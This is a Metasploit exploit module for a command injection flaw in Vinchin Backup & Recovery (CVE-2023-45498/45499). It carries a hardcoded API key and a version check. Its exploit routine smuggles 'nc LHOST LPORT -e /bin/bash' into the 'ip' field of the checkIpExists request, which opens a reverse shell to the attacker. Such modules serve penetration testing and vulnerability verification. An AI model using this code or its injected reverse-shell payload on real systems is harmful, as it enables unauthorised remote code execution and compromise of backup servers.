##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
        'Name' => 'Vinchin Backup & Recovery Command Injection',
        'Description' => %q{
        This module exploits a command injection vulnerability in Vinchin Backup & Recovery
        versions 5.0 to 7.0. Due to insufficient input validation in the
        checkIpExists API endpoint, an attacker can execute arbitrary commands as the
        web server user.
        },
        'License' => MSF_LICENSE,
        'Author' =>
        [
            'Gregory Boddin (LeakIX)',  # Vulnerability discovery
            'Valentin Lobstein',        # Metasploit module
        ],
        'References' =>
        [
            [ 'CVE', '2023-45498' ],
            [ 'CVE', '2023-45499' ],
            [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-45498' ],
            [ 'URL', 'https://nvd.nist.gov/vuln/detail/CVE-2023-45499' ],
            [ 'URL', 'https://blog.leakix.net/2023/10/vinchin-backup-rce-chain/' ],
            [ 'URL', 'https://vinchin.com/' ] # Vendor URL
        ],
        'DisclosureDate' => '2023-10-26',
        'Platform' => ['linux'],
        'Targets'        =>
        [
            ['Vinchin Backup & Recovery', {}]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
        'PAYLOAD' => 'generic/shell_reverse_tcp',
        'SSL' => true
        },
        'Privileged' => false
    ))

    register_options(
        [
        Opt::RPORT(443),
        OptString.new('TARGETURI', [ true, 'The base path to the Vinchin Backup & Recovery application', '/api/']),
        OptString.new('APIKEY', [true, 'The hardcoded API key', '6e24cc40bfdb6963c04a4f1983c8af71'])
        ])
    end
    
  def exploit
    print_status('Generating reverse shell command...')
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    injection_command = "nc #{lhost} #{lport} -e /bin/bash"

    print_status('Sending reverse shell payload...')
    send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(datastore['TARGETURI']),
      'vars_get'  => {
        'm' => '30',
        'f' => 'checkIpExists',
        'k' => datastore['APIKEY']
      },
      'data'      => "p={\"ip\":\"127.0.0.1 ;#{injection_command}\"}"
    })
  end

  def check
    target_uri_path = normalize_uri(target_uri.path.split('/')[0], '/login.php')
    res = send_request_cgi('uri' => target_uri_path)
  
    unless res
      print_error('Failed to connect to the target.')
      return CheckCode::Unknown('Failed to connect to the target.')
    end
  
    print_status("HTTP Response Code: #{res.code}")  
    version_pattern = /Vinchin build: (\d+\.\d+\.\d+\.\d+)/
    version_match = res.body.match(version_pattern)
  
    if version_match && version_match[1]
      version = version_match[1]
      print_status("Detected Vinchin version: #{version}")
      version = Gem::Version.new(version)
  
      vulnerable_versions = Gem::Requirement.new('>= 5.0', '< 7.1')
  
      if vulnerable_versions.satisfied_by?(version)
        return CheckCode::Vulnerable("Detected vulnerable version: #{version}")
      else
        return CheckCode::Safe("Detected non-vulnerable version: #{version}")
      end
    else
      print_error('Unable to extract version with the regex provided.')
      return CheckCode::Unknown('Unable to extract version.')
    end
  end   
end